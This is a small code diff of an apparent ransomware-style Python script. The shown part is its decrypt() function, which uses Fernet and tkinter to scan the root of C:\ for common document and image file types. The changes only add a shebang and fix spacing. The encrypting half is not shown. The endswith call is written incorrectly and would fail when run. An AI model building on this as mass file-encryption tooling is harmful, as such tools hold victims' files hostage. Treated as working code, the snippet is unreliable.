@@ -1,6 +1,8 @@
+#!/usr/bin/python3.8
 import tkinter, os
 from tkinter import messagebox
 from cryptography.fernet import Fernet
+
 
 def decrypt():
     # Decrypt the already encrypted files
@@ -9,8 +11,8 @@ def decrypt():
     if os.path.isdir("C:\\"):
         # Get files to work with
         for f_name in os.listdir('C:\\'):
-            if f_name.endswith('.txt', '.pdf','.ppt', '.xlsx',
-                               '.png', '.jpeg','.docx', '.doc'):
+            if f_name.endswith('.txt', '.pdf', '.ppt', '.xlsx',
+                               '.png', '.jpeg', '.docx', '.doc'):
                 file_name = f_name
 
                 # Start decryption
